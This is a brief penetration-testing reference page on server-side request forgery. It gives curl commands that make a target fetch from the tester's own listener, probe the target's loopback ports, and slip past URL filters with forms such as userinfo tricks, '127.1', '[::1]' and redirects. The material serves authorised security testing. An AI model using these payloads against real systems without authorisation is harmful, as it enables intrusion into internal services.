# Server-side request forgery (SSRF)

[← Foothold quick reference](../02-foothold.md)

Check URL fetchers: previews, imports, webhooks, PDF/file converters.

## Confirm the fetch

On Kali:

```bash
python3 -m http.server 8000
```

In another terminal:

```bash
curl -G 'http://<target>/fetch' \
  --data-urlencode 'url=http://<kali-ip>:8000/ssrf-check-01'
```

Listener hit confirms a server fetch; reflection alone does not. No hit: check reachability and delayed jobs.

## Check what it can reach

After callback, compare a known target-local port with an unused port:

```bash
curl -G 'http://<target>/fetch' \
  --data-urlencode 'url=http://127.0.0.1:8080/'
```

`127.0.0.1` is the target's loopback. If filtered, test parsing: `http://allowed.example@127.0.0.1:8080/` targets `127.0.0.1`. Verify the actual fetch.

```text
http://127.1:8080/
http://[::1]:8080/
http://<allowed-host>/redirect-to-loopback
```

Record requested URL, callback, and returned content separately.

[OWASP SSRF testing](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/19-Server-Side_Request_Forgery/)
